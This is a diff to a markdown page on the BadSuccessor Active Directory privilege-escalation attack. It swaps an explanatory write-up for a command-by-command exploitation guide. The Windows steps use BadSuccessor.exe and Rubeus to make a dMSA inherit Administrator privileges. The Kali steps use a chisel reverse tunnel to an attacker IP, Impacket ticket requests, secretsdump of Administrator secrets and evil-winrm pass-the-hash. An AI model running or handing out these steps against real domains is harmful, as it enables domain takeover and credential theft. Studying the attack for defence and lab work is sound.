@@ -1,19 +1,10 @@
-> Notes extracted from [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/BadSuccessor.html)
+A Delegated Managed Service Account (dMSA) is an AD principal in Windows Server 2025 designed to replace legacy service accounts by automatically inheriting their SPNs, group memberships, delegation settings, and even keys. This migration is controlled by a single attribute, `msDS-ManagedAccountPrecededByLink`, which tells the KDC which legacy account the dMSA is meant to “succeed.” When the migration state attribute `msDS-DelegatedMSAState` is set to value 2, the KDC treats the dMSA as the full successor of that predecessor.
 
-Delegated Managed Service Accounts (**dMSAs**) are an AD principal type introduced with **Windows Server 2025**. They are designed to replace legacy service accounts by allowing a one‑click “migration” that automatically copies the old account’s Service Principal Names (SPNs), group memberships, delegation settings, and even cryptographic keys into the new dMSA, giving applications a seamless cut‑over and eliminating Kerberoasting risk.
-
-Akamai researchers found that a single attribute — **`msDS‑ManagedAccountPrecededByLink`** — tells the KDC which legacy account a dMSA “succeeds”. If an attacker can write that attribute (and toggle **`msDS‑DelegatedMSAState` → 2**), the KDC will happily build a PAC that **inherits every SID of the chosen victim**, effectively allowing the dMSA to impersonate any user, including Domain Admins.
+The vulnerability comes from the fact that if an attacker can write `msDS-ManagedAccountPrecededByLink`, they can point a dMSA at any victim account, including Domain Admins. The KDC will then build a PAC for the dMSA that contains every SID and group of the chosen predecessor, effectively granting the attacker the victim’s entire identity. This results in full privilege escalation because the KDC itself issues cryptographically valid Kerberos tickets that impersonate the targeted account.
 
 
 ---
 
-
-## What exactly is a dMSA?
-
-- Built on top of **gMSA** technology but stored as the new AD class **`msDS‑DelegatedManagedServiceAccount`**.
-- Supports an **opt‑in migration**: calling `Start‑ADServiceAccountMigration` links the dMSA to the legacy account, grants the legacy account write access to `msDS‑GroupMSAMembership`, and flips `msDS‑DelegatedMSAState` = 1.
-- After `Complete‑ADServiceAccountMigration`, the superseded account is disabled and the dMSA becomes fully functional; any host that previously used the legacy account is automatically authorised to pull the dMSA’s password.
-- During authentication, the KDC embeds a **KERB‑SUPERSEDED‑BY‑USER** hint so Windows 11/24H2 clients transparently retry with the dMSA.
 
 ## Requirements to attack
 
@@ -27,40 +18,205 @@ Akamai researchers found that a single attribute — **`msDS‑ManagedAccountPre
 ---
 
 
-## Step‑by‑step: BadSuccessor privilege escalation
+## BadSuccessor exploitation
 
-1. **Locate or create a dMSA you control** 
+#### From Powershell
+
+To perform the exploitation, you can download the `.exe` binary from
 
 ```bash
-New‑ADServiceAccount Attacker_dMSA `
-	‑DNSHostName ad.lab `
-	‑Path "OU=temp,DC=lab,DC=local"
+wget https://github.com/ibaiC/BadSuccessor/blob/main/BadSuccessor/obj/Debug/BadSuccessor.exe
+```
+
+1. **Check if the domain is vulnerable to BadSuccessor**
+
+This command extracts the vulnerable OUs.  
+
+```powershell
+.\BadSuccessor.exe find
+```
+
+2. **Create a dMSA you control** 
+
+This step creates a delegated Managed Service Account (dMSA) in an OU you control and links it to the Administrator account. The purpose is to inherit Administrator privileges through the dMSA object.
+
+```powershell
+.\BadSuccessor.exe escalate `
+  -targetOU "OU=<OrganizationalUnit>,DC=<Domain>,DC=<TLD>" `
+  -dmsa <DMSA_Name> `
+  -targetUser "CN=<TargetUser>,CN=Users,DC=<Domain>,DC=<TLD>" `
+  -dnshostname <DMSA_Hostname_FQDN> `
+  -user <DelegatedUser> `
+  -dc-ip <DomainController_IP>
 ```
 
 
-Because you created the object inside an OU you can write to, you automatically own all its attributes .
+3. **Request a TGT for your controlled user**
 
-2. **Simulate a “completed migration” in two LDAP writes**:
-    - Set `msDS‑ManagedAccountPrecededByLink = DN` of any victim (e.g. `CN=Administrator,CN=Users,DC=lab,DC=local`).
-    - Set `msDS‑DelegatedMSAState = 2` (migration‑completed).
+Next, you need to request a Ticket Granting Ticket (TGT) for your own user account. This is necessary to authenticate against the domain and inject the ticket into your current session for later use.
 
-Tools like **Set‑ADComputer, ldapmodify**, or even **ADSI Edit** work; no domain‑admin rights are needed.
+- `/user:` → The username of the account you want to request a TGT for (e.g. `attackeruser`).
+- `/password:` → The plaintext password of that account (e.g. `SuperSecret123!`).
+- `/domain:` → The Active Directory domain name (e.g. `domain.local`).
+- `/dc:` → The Domain Controller’s FQDN or IP address (e.g. `dc01.eighteen.htb` or `10.10.11.95`).
 
-3. **Request a TGT for the dMSA** — Rubeus supports the `/dmsa` flag:
-```bash
-Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
+```powershell
+.\Rubeus.exe asktgt `
+  /user:<AttackerUser> `
+  /password:<AttackerPassword> `
+  /domain:<DomainName> `
+  /dc:<DomainControllerFQDN> `
+  /enctype:aes256 `
+  /nowrap `
+  /ptt
 ```
 
-The returned PAC now contains the SID 500 (Administrator) plus Domain Admins/Enterprise Admins groups.
+4. **Request a TGT for the dMSA** 
+
+Ask for a service ticket (TGS) for the `krbtgt` service using the dMSA you created. The reason is to leverage the dMSA’s inherited Administrator privileges and obtain a Kerberos ticket that reflects elevated rights.
+
+```powershell
+.\Rubeus.exe asktgs `
+  /targetuser:<NewDMSAName>$ `
+  /service:krbtgt/<DomainNameUppercase> `
+  /opsec `
+  /dmsa `
+  /nowrap `
+  /ptt `
+  /domain:<DomainName> `
+  /dc:<DomainControllerFQDN> `
+  /ticket:<TGTFileOrHandle>
+```
+
+5. **Request a TGS for the Domain Controller** 
+
+Finally, you request a TGS for the CIFS service on the Domain Controller. This is done to gain privileged access to SMB file shares on the DC, confirming that the escalation worked and allowing direct interaction with sensitive resources.
+
+```powershell
+.\Rubeus.exe asktgs `
+  /user:<DMSA_Account$> `
+  /service:cifs/<DomainControllerFQDN> `
+  /opsec `
+  /dmsa `
+  /nowrap `
+  /ptt `
+  /ticket:<Base64_TGT>
+```
+
+6. **Verify the access**
+
+Finally, confirm that the escalation worked by checking tickets and accessing restricted resources.
+
+- Verify tickets in memory:
+```powershell
+klist
+```
+
+- Access restricted resources
+```powershell
+dir \\<DomainControllerFQDN>\Users\Administrator
+```
 
 
----
 
-## Gather all the users passwords
+#### From Kali
 
-During legitimate migrations the KDC must let the new dMSA decrypt **tickets issued to the old account before cut‑over**. To avoid breaking live sessions it places both current‑keys and previous‑keys inside a new ASN.1 blob called **`KERB‑DMSA‑KEY‑PACKAGE`**.
+1. **Create dMSA successor (Windows / PowerShell)**
 
-Because our fake migration claims the dMSA succeeds the victim, the KDC dutifully copies the victim’s RC4‑HMAC key into the **previous‑keys** list – even if the dMSA never had a “previous” password. That RC4 key is unsalted, so it is effectively the victim’s NT hash, giving the attacker **offline cracking or “pass‑the‑hash”** capability.
+- Use **BadSuccessor** to create a Delegated Managed Service Account (dMSA) and link it to a privileged account:
 
-Therefore, mass‑linking thousands of users lets an attacker dump hashes “at scale,” turning **BadSuccessor into both a privilege‑escalation and credential‑compromise primitive**.
+```powershell
+BadSuccessor -mode exploit `
+  -Path "OU=<OrganizationalUnit>,DC=<Domain>,DC=<TLD>" `
+  -Name "<DMSA_Name>" `
+  -DelegatedAdmin "<DelegatedUser>" `
+  -DelegateTarget "<TargetUser>" `
+  -domain "<DomainName>"
+```
+
+
+2. **Establish SOCKS tunnel (Windows / PowerShell)**
+
+- On the compromised host (client):
+
+```powershell
+./chisel.exe client <Attacker_IP>:<Port> R:<LocalPort>:socks
+```
+
+- On the attacker machine (kali):
+
+```powershell
+./chisel.exe server --socks5 -p <Port> --reverse
+```
+
+
+3. **Fix clock skew (Kali)**
+
+- Synchronize time with the Domain Controller:
+
+```bash
+python3 fixtime.py -u http://<DC_IP>
+```
+
+
+4. **Request S4U2Self ticket (Kali)**
+
+- Ask for a Kerberos ticket impersonating the dMSA:
+
+```bash
+proxychains4 python3 getST.py '<Domain>/<DelegatedUser>:<Password>' \
+  -impersonate '<DMSA_Name>$' \
+  -self \
+  -dc-ip <DC_IP>
+```
+
+- Export the resulting cache:
+
+```bash
+export KRB5CCNAME='<DMSA_Name>$@krbtgt_<DOMAIN_UPPER>@<DOMAIN_UPPER>.ccache'
+```
+
+
+5. **Request service ticket for CIFS (Kali)**
+
+- Use Impacket to get a CIFS ticket for the DC:
+
+```bash
+proxychains4 impacket-getST -k -no-pass \
+  -spn cifs/<DC_FQDN> '<Domain>/<DMSA_Name>$'
+```
+
+- Export again:
+
+```bash
+export KRB5CCNAME='<DMSA_Name>$@cifs_<DC_FQDN>@<DOMAIN_UPPER>.ccache'
+```
+
+
+6. **Re‑sync time if needed**
+
+- If Kerberos errors appear, run:
+
+```bash
+python3 fixtime.py -u http://<DC_IP>
+```
+
+
+7. **Dump secrets (Kali)**
+
+- Extract Administrator secrets with Impacket:
+
+```bash
+proxychains4 -q impacket-secretsdump -k -no-pass <DC_FQDN> \
+  -just-dc-user <TargetUser> -dc-ip <DC_IP>
+```
+
+
+8. **Confirm access (Kali)**
+
+- Log in with Evil‑WinRM:
+
+```bash
+evil-winrm -i <DC_FQDN> -u <TargetUser> -H '<NTLM_Hash>'
+```
 
